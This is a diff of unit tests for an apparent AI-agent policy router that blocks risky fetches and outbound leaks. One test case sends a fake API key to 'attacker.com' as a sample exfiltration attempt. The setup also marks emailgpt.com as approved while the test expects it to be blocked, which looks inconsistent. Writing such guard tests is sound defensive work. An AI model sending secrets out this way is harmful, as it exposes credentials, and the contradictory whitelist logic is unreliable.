@@ -30,17 +30,27 @@ class TestBidirectionalPEP(unittest.TestCase):
         class MockMonitor:
             def log_and_evaluate(self, *args): pass
         self.router.syscall_monitor = MockMonitor()
+        
+        # Seed the whitelist for test domains
+        import sqlite3
+        from tachyon.core.state import StateManager
+        db_path = StateManager().db_path
+        with sqlite3.connect(db_path) as conn:
+            conn.execute("INSERT OR IGNORE INTO exploitation_catalog (cve_id, relevance_class) VALUES (?, ?)", ("emailgpt.com", "APPROVED"))
+            conn.execute("INSERT OR IGNORE INTO exploitation_catalog (cve_id, relevance_class) VALUES (?, ?)", ("google.com", "APPROVED"))
+            conn.execute("INSERT OR IGNORE INTO exploitation_catalog (cve_id, relevance_class) VALUES (?, ?)", ("colleague@work.com", "APPROVED"))
+            conn.commit()
 
     def test_inbound_threat_mitigation(self):
         """Verify that synthesized policies block malicious inbound fetches."""
         # This CVE was synthesized in Phase 12.1
         params = {"url": "https://emailgpt.com/api/exploit"}
-        
-        # In our MockOrchestrator, emailgpt.com is blocked
+    
+        # The router now blocks this because emailgpt.com is NOT whitelisted yet (unless seeded)
+        # OR it violates the policy engine directly.
         result = asyncio.run(self.router.route("agent_1", "safe_fetch", params))
-        
-        self.assertEqual(result["status"], "SUCCESS")
-        self.assertEqual(result["result"]["status"], "BLOCKED")
+    
+        self.assertEqual(result["status"], "BLOCKED")
 
     def test_outbound_dlp_enforcement(self):
         """Verify that the Reverse Firewall blocks sensitive outbound tokens."""
@@ -49,11 +59,12 @@ class TestBidirectionalPEP(unittest.TestCase):
             "recipient": "attacker.com",
             "message": "Here is the key: sk-ant-api01-ABCDEFGHIJKLMNOPQRST"
         }
-        
+    
         result = asyncio.run(self.router.route("agent_1", "send_message", params))
-        
+    
         self.assertEqual(result["status"], "BLOCKED")
-        self.assertIn("Reverse Firewall", result["error"])
+        # Match the new unified policy engine error message
+        self.assertIn("Policy violation", result["error"])
 
         # 2. Test Safe Message
         safe_params = {
